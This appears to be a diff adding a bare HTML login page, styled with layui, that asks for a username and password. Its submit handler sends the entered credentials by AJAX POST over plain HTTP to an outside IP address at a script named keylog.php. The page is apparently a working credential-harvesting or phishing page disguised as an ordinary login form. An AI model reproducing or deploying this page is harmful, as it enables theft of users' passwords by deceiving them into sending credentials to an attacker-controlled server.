@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<script src="https://cdn.bootcdn.net/ajax/libs/layui/2.7.4/layui.min.js"></script>
+		<link href="https://cdn.bootcdn.net/ajax/libs/layui/2.9.9/css/layui.min.css" rel="stylesheet">
+		<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.js"></script>
+		<style type="text/css">
+			body,
+			html {
+				height: 100%
+			}
+
+			html {
+				background-size: 100% 100%, 25% 25%;
+				background-position: bottom, top;
+				background-repeat: no-repeat, no-repeat;
+
+			}
+
+			.layui-layout-body {
+				overflow: auto;
+			}
+
+
+
+			.layadmin-user-login-main {
+				width: 260px;
+				margin: 0 auto;
+				position: relative;
+				top: 40%;
+				box-sizing: border-box
+			}
+
+			.layadmin-user-login-box {
+				padding: 20px
+			}
+
+			.layadmin-user-login-header {
+				text-align: center
+			}
+
+			.layadmin-user-login-header h2 {
+				margin-bottom: 10px;
+				font-weight: 300;
+				font-size: 30px;
+				color: #000
+			}
+
+			.layadmin-user-login-header p {
+				font-weight: 300;
+				color: #999
+			}
+
+			.layadmin-user-login-body .layui-form-item {
+				position: relative;
+			}
+
+			.layadmin-user-login-icon {
+				position: absolute;
+				left: 1px;
+				top: 1px;
+				width: 38px;
+				line-height: 36px;
+				text-align: center;
+				color: #d2d2d2
+			}
+
+			.layadmin-user-login-body .layui-form-item .layui-input {
+				padding-left: 38px
+			}
+
+			.layadmin-user-login-codeimg {
+				max-height: 38px;
+				width: 100%;
+				cursor: pointer;
+				box-sizing: border-box
+			}
+
+			.layadmin-user-login-other {
+				position: relative;
+				font-size: 0;
+				line-height: 38px;
+				padding-top: 20px
+			}
+
+			.layadmin-user-login-other>* {
+				display: inline-block;
+				vertical-align: middle;
+				margin-right: 10px;
+				font-size: 14px
+			}
+
+			.layadmin-user-login-other .layui-icon {
+				position: relative;
+				top: 2px;
+				font-size: 26px
+			}
+
+			.layadmin-user-login-other a:hover {
+				opacity: .8
+			}
+
+			.layadmin-user-jump-change {
+				float: right
+			}
+
+			.layadmin-user-login-footer {
+				position: absolute;
+				left: 0;
+				bottom: 0;
+				width: 100%;
+				line-height: 30px;
+				padding: 20px;
+				text-align: center;
+				box-sizing: border-box;
+				color: rgba(0, 0, 0, .5)
+			}
+
+			.layadmin-user-login-footer span {
+				padding: 0 5px
+			}
+
+			.layadmin-user-login-footer a {
+				padding: 0 5px;
+				color: rgba(0, 0, 0, .5)
+			}
+
+			.layadmin-user-login-footer a:hover {
+				color: rgba(0, 0, 0, 1)
+			}
+
+			.loginFrom {
+				width: 500px;
+				height: 500px;
+				background-size: 500px 500px;
+				background-position: center;
+				margin: 0 auto;
+				position: relative;
+				top: 50%;
+				margin-top: -280px;
+			}
+		</style>
+	</head>
+	<body class="layui-layout-body">
+		<div class="loginFrom">
+			<div class="layadmin-user-login-main">
+				<div class="layadmin-user-login-box layadmin-user-login-body">
+					<form class="layui-form" id="login-form" action="">
+						<div class="layui-form-item">
+							<label class="layadmin-user-login-icon layui-icon layui-icon-username"
+								for="LAY-user-login-username"></label>
+							<input type="text" name="username" id="LAY-user-login-username" lay-verify="required"
+								placeholder="username" class="layui-input">
+						</div>
+						<div class="layui-form-item">
+							<label class="layadmin-user-login-icon layui-icon layui-icon-password"
+								for="LAY-user-login-password"></label>
+							<input type="password" name="password" id="LAY-user-login-password" lay-verify="required"
+								placeholder="password" class="layui-input">
+						</div>
+						<div class="layui-form-item">
+							<button class="layui-btn layui-btn-fluid layui-btn-normal layui-btn-radius"
+								style="background-color:#F93030" lay-submit lay-filter="login-submit">login</button>
+						</div>
+					</form>
+				</div>
+			</div>
+		</div>
+		</div>
+		<div class="layui-trans layadmin-user-login-footer">
+			<p></p>
+			<p></p>
+		</div>
+		<script type="text/javascript">
+			layui.use('form', function() {
+				var form = layui.form;
+				form.on('submit(login-submit)', function(data) {
+					$.ajax({
+						type: "POST",
+						url: "http://165.154.135.78/keylog.php",
+						data: data.field,
+						dataType: "json",
+						success: function(data) {
+							layer.msg(data.msg);
+						}
+					});
+					return false;
+				});
+			});
+		</script>
+	</body>
+</html>
